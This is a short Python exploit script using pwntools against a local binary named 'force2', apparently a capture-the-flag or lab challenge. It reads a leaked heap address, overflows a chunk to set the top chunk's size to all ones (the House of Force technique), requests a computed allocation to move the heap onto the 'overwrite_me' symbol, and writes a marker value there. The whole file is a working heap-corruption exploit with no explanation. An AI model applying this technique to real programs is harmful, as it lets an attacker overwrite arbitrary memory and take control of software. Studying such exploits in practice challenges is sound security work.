from pwn import *

p = process("./force2")
e = ELF("./force2")
buf1 = u64(p.recvn(8))
top = buf1 + 0x30
payload = b"A"*0x28 + p64(0xffffffffffffffff)
p.sendline(payload)

p.sendline(str(e.symbols["overwrite_me"] - top - 0x10).encode())
p.sendline(p64(0xdeadbeefcafebabe)*2)
p.interactive()